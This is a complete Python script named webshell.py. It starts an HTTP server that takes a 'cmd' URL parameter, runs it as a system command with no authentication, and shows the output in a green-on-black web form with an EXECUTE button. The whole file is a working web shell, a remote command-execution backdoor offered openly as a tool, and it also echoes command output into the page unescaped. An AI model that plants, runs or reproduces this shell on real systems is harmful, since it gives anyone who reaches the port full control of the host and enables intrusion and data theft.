#!/usr/bin/python3

'''
  webshell.py 2020 Patryk Hatka 
  https://ores.one
'''

import http.server
import socketserver
from urllib.parse import urlparse
from urllib.parse import parse_qs
import subprocess
import sys

class HttpRequestHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()

        cmd = ''
        output = ''
        query_components = parse_qs(urlparse(self.path).query)
        if 'cmd' in query_components:
            cmd = query_components['cmd'][0]

            try:
              p = subprocess.Popen(cmd.split(), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
              p.wait()
              out, err = p.communicate()
              out = out.decode('utf-8').replace('\n', '<br>')
              output = f'''<html>
                <body>
                <h1>Command:  {cmd}</h1>
                <br><br>

                <h1>Output: </h1>
                {out}
                <br><br>
                </body>
            </html>'''
            except Exception as e:
              output = 'Error during execution'


        html = f'''<html>
        <style type="text/css">
            body{{
            background-color: black;
            color: green;
            font-family: 'Roboto Mono', monospace;
          }}

          input         {{
            font-size:18px;
            padding:10px 10px 10px 5px;
            width:300px;
            border:none;
            border-bottom:2px solid #757575;
            background: black;
            color: green;
          }}
          input:focus{{
              outline: none;
            }}

          button{{
            font-size:18px;
            padding:10px 10px 10px 5px;
            background: black;
            color: green;
            border: 2px solid #757575;
          }}</style>
          <body>
            <center>
                <input id="cmd" type="text" name="cmd">
                <button onClick="execute()">EXECUTE</button>
            </center>
            
          <hr>

          {output}
          <script type="text/javascript">
          var cmd = document.getElementById("cmd");
          cmd.focus();
          cmd.addEventListener("keyup", function(event) {{
            if (event.keyCode === 13) {{
              event.preventDefault();
              execute();
            }}
          }});
          function execute() {{
            var a = document.getElementById("cmd").value;
            window.location.href = "?cmd=" + a;
          }}
          </script>
          </body>
        </html>'''

        self.wfile.write(bytes(html, "utf8"))

        return

handler_object = HttpRequestHandler

PORT = 8000

if len(sys.argv) > 1:
  try:
    PORT = int(sys.argv[1])
  except:
    pass


my_server = socketserver.TCPServer(("", PORT), handler_object)
my_server.serve_forever()

